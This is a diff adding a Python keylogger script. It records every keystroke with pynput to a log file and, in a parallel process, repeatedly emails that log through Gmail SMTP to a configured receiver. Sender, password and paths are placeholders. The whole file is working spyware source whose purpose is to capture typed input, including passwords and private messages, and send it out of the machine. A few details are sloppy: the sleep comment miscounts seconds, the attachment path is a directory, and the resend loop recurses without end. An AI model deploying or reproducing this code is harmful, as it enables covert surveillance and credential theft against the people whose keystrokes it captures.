@@ -1,0 +1,91 @@
+import pynput
+from pynput.keyboard import Key, Listener
+import logging
+from email.message import EmailMessage
+import ssl
+import smtplib
+import time
+import multiprocessing
+
+# Keylogger script
+def keylogger():
+
+    print('Starting keylogger')
+
+    log_dir = r'/your-direcotry/'
+    keylog_name = r'keylog.txt'
+
+    logging.basicConfig(filename=(log_dir + keylog_name), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+    def on_press(key):
+        logging.info(str(key))
+
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+print('keylog started')
+
+# Email sending script
+def send_email():
+    email_sender = r'your-email'
+    email_password = r'your-password'
+    email_receiver = r'your-receiver'
+
+    subject = 'Keylogger Report'
+    body = r'Here follows the report of the keylogger'
+
+    print('Sending Email...')
+
+    em = EmailMessage()
+    em['From'] = email_sender
+    em['to'] = email_receiver
+    em['subject'] = subject
+    em.set_content(body)
+
+    print('Loading Attachment...')
+
+    with open('/your-directory/', 'rb') as f:
+        file_data = f.read()
+        file_type = f.name
+        file_name = f.name
+
+    em.add_attachment(file_data, maintype='txt', subtype=file_type, filename=file_name)
+
+    print('Attachment Loaded')
+
+    print('Connecting to the SMTP Server..')
+
+    context = ssl.create_default_context()
+
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
+        smtp.login(email_sender, email_password)
+        smtp.sendmail(email_sender, email_receiver, em.as_string())
+
+    print('SMTP Server Connected')
+
+    print('Email Sent')
+
+    # Email Cooldown  18000 = 30 min / 36000 = 1 hour
+
+    time.sleep(36000)
+
+    send_email()
+
+    # End of the looping
+
+
+# Multiprocessing
+    
+if __name__ == '__main__':
+
+    # Create processes for keylogger and email sending
+    keylogger_process = multiprocessing.Process(target=keylogger)
+    email_process = multiprocessing.Process(target=send_email)
+
+    # Start both processes
+    keylogger_process.start()
+    email_process.start()
+
+    # Wait for both processes to finish
+    keylogger_process.join()
+    email_process.join()
